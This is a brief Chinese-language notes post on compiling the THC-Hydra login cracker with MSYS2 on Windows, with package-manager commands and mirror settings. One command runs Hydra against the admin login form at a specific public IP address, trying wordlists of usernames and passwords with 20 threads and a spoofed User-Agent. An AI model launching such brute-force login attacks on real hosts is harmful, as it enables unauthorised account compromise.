---
author: XhstormR
categories:
- Notes
date: 2019-03-01T14:11:28+08:00
title: 构建 hydra
---

<!--more-->

Updated on 2019-03-01

> [MSYS2](https://mirrors.tuna.tsinghua.edu.cn/msys2/distrib/msys2-x86_64-latest.tar.xz)
>
> [hydra](https://github.com/vanhauser-thc/thc-hydra/archive/master.zip)

## Step
```bash
D:\Work\Download\thc-hydra-master>

pacman -Syu
pacman -S --noconfirm --needed gcc make openssl-devel

./configure && make

hydra -V -F -L username.txt -P password.txt -o ok.txt -t 20 'http-post-form://222.69.159.53:80/cm_admin/login.aspx:txtloginid=^USER^&txtpsw=^PASS^:F=password incorrect!:H=User-Agent\: wget'
```

```bash
pacman -F  jq.exe #搜索软件包（By File）
pacman -Ss gcc    #搜索软件包（By Name）
pacman -Sg mingw-w64-x86_64-toolchain mingw-w64-i686-toolchain #查看软件组
```

```bash
echo 'Server = https://mirrors.tuna.tsinghua.edu.cn/msys2/msys/$arch/' > /etc/pacman.d/mirrorlist.msys
echo 'Server = https://mirrors.tuna.tsinghua.edu.cn/msys2/mingw/i686/' > /etc/pacman.d/mirrorlist.mingw32
echo 'Server = https://mirrors.tuna.tsinghua.edu.cn/msys2/mingw/x86_64/' > /etc/pacman.d/mirrorlist.mingw64
pacman -Sy
```

## Reference
* 依赖：
  * msys-2.0.dll：[src](https://mirrors.tuna.tsinghua.edu.cn/msys2/msys/sources/msys2-runtime-3.0.7-3.src.tar.gz) | [bin](https://mirrors.tuna.tsinghua.edu.cn/msys2/msys/x86_64/msys2-runtime-3.0.7-3-x86_64.pkg.tar.xz)
  * msys-z.dll：[src](https://mirrors.tuna.tsinghua.edu.cn/msys2/msys/sources/zlib-1.2.11-1.src.tar.gz) | [bin](https://mirrors.tuna.tsinghua.edu.cn/msys2/msys/x86_64/zlib-1.2.11-1-x86_64.pkg.tar.xz)
  * msys-ssl-1.1.dll, msys-crypto-1.1.dll：[src](https://mirrors.tuna.tsinghua.edu.cn/msys2/msys/sources/openssl-1.1.1.c-1.src.tar.gz) | [bin](https://mirrors.tuna.tsinghua.edu.cn/msys2/msys/x86_64/libopenssl-1.1.1.c-1-x86_64.pkg.tar.xz)
* https://www.msys2.org/
* https://packages.msys2.org/group/
* https://mirrors.ustc.edu.cn/help/msys2.html
* https://github.com/msys2/MSYS2-packages/tree/master/pacman-mirrors
